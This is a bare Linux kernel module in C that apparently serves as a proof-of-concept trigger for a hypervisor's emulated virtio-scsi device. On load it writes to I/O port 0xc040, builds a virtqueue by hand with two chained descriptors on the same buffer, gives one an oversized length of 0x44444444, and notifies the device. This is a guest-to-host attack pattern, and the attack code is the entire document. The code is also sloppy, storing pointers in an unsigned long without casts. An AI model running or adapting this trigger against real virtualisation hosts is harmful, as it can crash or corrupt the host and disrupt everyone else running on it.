#include <linux/io.h>
#include <linux/ioport.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/slab.h>

#define SIZE 8
#define VIRTIO_SCSI_IO  0xc040
MODULE_LICENSE("GPL");

typedef struct cmd_req
{
  u8 lun[8];
  u64 tag;
  u8 task_attr;
  u8 prio;
  u8 crn;
  u8 cdb[8];
}cmdq;

typedef struct tmf_req
{
  u32 type;
  u32 subtype;
  u8 lun[8];
  u64 tag;
}tmfq;

typedef struct an_req
{
  u32 type;
  u8 lun[8];
  u32 event_requested;
}anq;

typedef union {
  cmdq cmd;
  tmfq tmf;
  anq an;
}VirtIOSCSIReq;

typedef struct VRingDesc
{
  u64 addr;
  u32 len;
  u16 flags;
  u16 next;
}VRingDesc;

typedef struct VRingAvail
{
  u16 flags;
  u16 idx;
  u16 ring[];
}VRingAvail;

typedef struct VRingUsedElem
{
  u32 id;
  u32 len;
}VRingUsedElem;

typedef struct VRingUsed
{
  u16 flags;
  u16 idx;
  VRingUsedElem ring[];
}VRingUsed;

void queue_pfn(u32 value)
{
  outl(value,VIRTIO_SCSI_IO + 8);
}

void queue_sel(u16 value)
{
  outw(value,VIRTIO_SCSI_IO + 14);
}

void queue_notify(u32 value)
{
  outl(value,VIRTIO_SCSI_IO + 16);
}

int handle_cmd(void)
{
  VRingDesc *desc1;
  VirtIOSCSIReq * buffer;
  VRingAvail *avail;
  VRingUsed *used;
  unsigned long big,tmp;
  big = kmalloc(0x10000,GFP_KERNEL);//align
  memset(big,0,0x10000);
  desc1 = big;
  avail = big + 0x800;
  used = big + 0x1000;
  buffer = kmalloc(0x1000,GFP_KERNEL);
  memset(buffer,0,0x1000);

  desc1[0].addr = (u64)virt_to_phys(buffer);
  desc1[0].len = (u32)0x33;
  desc1[0].flags = 0x1;
  desc1[0].next = 0x1;

  desc1[1].addr = (u64)virt_to_phys(buffer);
  desc1[1].flags = 0x2;
  desc1[1].next = 0x2;
  desc1[1].len = 0x44444444;

  avail->idx = 1;

  queue_sel(2);
  tmp = big & 0xffffffff;
  queue_pfn(tmp>>12);
  queue_notify(2);

  kfree(buffer);
  kfree(desc1);
  return 0;
}

int start_fuzzing(void)
{
  handle_cmd();
}

int clean_module(void)
{
  printk(KERN_ALERT"[+]Exit!\n");
  return 0;
}

module_init(start_fuzzing);
module_exit(clean_module);